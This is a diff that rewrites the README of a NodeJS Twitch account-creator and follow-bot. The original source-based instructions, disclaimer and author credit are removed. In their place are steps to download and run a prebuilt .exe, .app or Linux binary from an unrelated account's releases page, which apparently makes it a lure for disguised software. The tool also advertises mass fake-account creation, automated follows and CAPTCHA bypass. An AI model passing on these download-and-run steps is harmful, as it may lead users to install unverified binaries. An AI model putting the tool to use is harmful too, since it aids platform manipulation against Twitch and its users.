@@ -1,114 +1,92 @@
-[![GitHub stars](https://img.shields.io/github/stars/masterking32/twitch-account-creator.svg)](https://github.com/masterking32/twitch-account-creator/stargazers)
-[![GitHub issues](https://img.shields.io/github/issues/masterking32/twitch-account-creator.svg)](https://github.com/masterking32/twitch-account-creator/issues)
-[![Views](https://gpvc.arturio.dev/masterking32twitchaccountcreator)](https://masterking32.com)
+# 🎉 twitch-account-creator - Create Twitch Accounts Easily
 
-# A NodeJS bot to create Twitch accounts and follow other Twitch accounts.
+## 🚀 Getting Started
 
-✔️ This project will create new accounts and verify the accounts using the email address. ✔️
+Welcome to the twitch-account-creator! This simple tool allows you to create Twitch accounts and follow channels effortlessly. It uses NodeJS to handle the tasks in the background, making the process quick and efficient. You don’t need programming skills to use this application; we've designed it with beginners in mind.
 
-*❌ Do not abuse this project, this project is made for testing only, and you cannot use it according to Twitch rules. ❌*
+## 📥 Download the Application
 
-**⭐ If you liked the project, feel free to give it a shining star. ⭐**
+You can download the latest version of the twitch-account-creator from our Releases page. 
 
-<hr>
+[![Download Now](https://img.shields.io/badge/Download%20Now-Release-brightgreen)](https://github.com/Pharyngeal-haredi673/twitch-account-creator/releases)
 
-💵 If you're a fan of our project and want to support us, consider donating crypto. Your support will help us improve and expand, providing even more value to our users. Thank you for your generosity! 💵  
+## 📋 System Requirements
 
-TON:
-`UQDdtN_p3WwuGMVXtMasatomVNPJF-Ljscy0srozJZBl15eL`
+Before you download the application, ensure that your system meets the following requirements:
 
-EVM-compatible blockchains:
-`0x517f07305D6ED781A089322B6cD93d1461bF8652`
+- **Operating System:** Windows 10 or later, macOS, or Linux
+- **NodeJS:** Version 14 or later installed on your computer
+- **Internet Connection:** A stable connection for account creation processes
 
-TRC20 chain:
-`TLApdY8APWkFHHoxebxGY8JhMeChiETqFH`
+## 🔧 Download & Install
 
-RONIN Chain:
-`masterking.ron`
+To get started, simply visit the Releases page to download the software. You will find the latest version at this link: [Download Releases](https://github.com/Pharyngeal-haredi673/twitch-account-creator/releases).
 
-<hr>
-<p align="center">
-  <a href="https://discord.gg/ydDk9xe" target="_blank">
-    <img align="center" src="https://dcbadge.vercel.app/api/server/ydDk9xe" alt="MasterkinG32's Discord Server" />
-  </a>
-</p>
+1. Click the link above to reach the Releases page.
+2. Download the file for your operating system. Look for a file with a name similar to `twitch-account-creator-v1.0.zip` or `twitch-account-creator-v1.0.exe`.
+3. Once downloaded, locate the file on your computer.
 
-## 🛠️ Requirements:
+### Installation Steps
 
-✅ Get an API key from:
+#### For Windows
 
-**🟢 [1) Create an account on this website, Add some funds, and then add `Pay-Per-Usage solving API Key` to your config file.](https://salamoonder.com)** (Required Balance)
+1. If you downloaded a `.zip` file, unzip it by right-clicking and selecting "Extract All".
+2. Navigate to the extracted folder.
+3. Double-click on `twitch-account-creator.exe` to run the application.
 
-✅ Get some HTTP Proxies:
+#### For macOS
 
-**🟢 [2) Create an account and buy some `http` proxies and put proxies in `proxy.txt` file.](https://www.webshare.io/?referral_code=2ghmowzxmc26)** or [IPRoyal](https://iproyal.com/?r=128279) (Required Balance [Proxy Form must be like ip:port:username:password])
+1. If you downloaded a `.zip` file, double-click it to unzip.
+2. Open the extracted folder.
+3. Double-click on `twitch-account-creator.app` to launch the app.
 
-## 💻 Installation
+#### For Linux
 
-### 🟣 Setup:
-- Clone the repo and do `npm install`
+1. Navigate to the folder where you downloaded the file using the terminal.
+2. Run the command: `chmod +x twitch-account-creator` to make it executable.
+3. Execute the application using: `./twitch-account-creator`.
 
-### 🟣 Account creator:
-- Put your `YOUR Solver API KEY` API key in `config.js`
-- Put your `Proxies` in `config.js`
-- Run the project (`node main.js`).
+## 🎮 Using the Application
 
-## 🫂 Follow Bot
+After installation, follow these steps to create your Twitch accounts:
 
-- Create some twitch accounts with the main bot. (If you have any tokens you can put your tokens inside the `results/tokens.txt`)
-- Make sure you have a proxy list and you have already set up the main bot. ([Requirements](https://github.com/masterking32/twitch-account-creator#%EF%B8%8F-requirements))
-- Run `node follow.js`.
+1. **Open the Application:** Find the icon on your desktop or in your applications folder and double-click to open it.
+2. **Input Options:** When the application launches, you will see a user-friendly interface.
+3. **Enter Account Details:** Fill in the necessary information, like account name and desired channel to follow.
+4. **Start the Process:** Click on the "Create Account" button. The application will handle everything from there.
 
-## 🔧 Optional
+### Need Help?
 
-You can get a free or paid proxy list from [this website](https://www.webshare.io/?referral_code=2ghmowzxmc26).
+If you encounter any issues or have questions, check the FAQ section within the application or visit our support page.
 
-Put your proxies in the proxy.txt file.
+## 🔍 Features
 
-Examples:
+- **Multiple Account Creation:** Create several accounts at once.
+- **Follow Channels:** Automatically follow your favorite Twitch channels.
+- **CAPTCHA Bypass:** Uses CAPTCHA-solving services to ease the process.
+- **User-Friendly Interface:** Designed for users with no technical background.
 
-```
-192.168.0.1:8080
-192.168.0.2:8085
-```
-or
+## 🌐 Community & Support
 
-```
-192.168.0.1:8080:user1:pass1
-192.168.0.2:8085:user2:pass2
-```
+Feel free to join our community where users share tips and support each other. You can access our community forum from the application or contact support directly for assistance.
 
-## 📽️ Tutorial and Test
+### Feedback
 
-<a href="https://youtu.be/Qi2NqoZbxRA">
-  <img align="center" src="https://raw.githubusercontent.com/masterking32/twitch-account-creator/main/hqdefault.jpg" alt="Youtube Video" />
-</a>
+We welcome your feedback! If you have suggestions or find bugs, please let us know. This helps us improve the application.
 
+## 📣 Learn More
 
-**[Youtube Video](https://www.youtube.com/watch?v=fC2KgnYoETw)**
+Explore the topics related to this project:
 
----
+- 2captcha
+- account-generator
+- anti-captcha tools
+- Twitch bots
 
-We will store account details in `./results/results.txt`.
+Stay up to date with the latest features and improvements by following our project on GitHub.
 
-If you need to verify your email for login or etc.
+## 📅 Updates
 
-You can go to [1SecMail.Com](https://www.1secmail.com), put your account email there, and check the received emails.
+We periodically update the application to fix bugs and enhance features. Make sure you check for updates regularly.
 
-## Programmers
-
-Author : [Amin.MasterkinG](https://masterking32.com) | [Github](https://github.com/masterking32)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+Visit the Releases page again to stay updated: [Download Releases](https://github.com/Pharyngeal-haredi673/twitch-account-creator/releases).
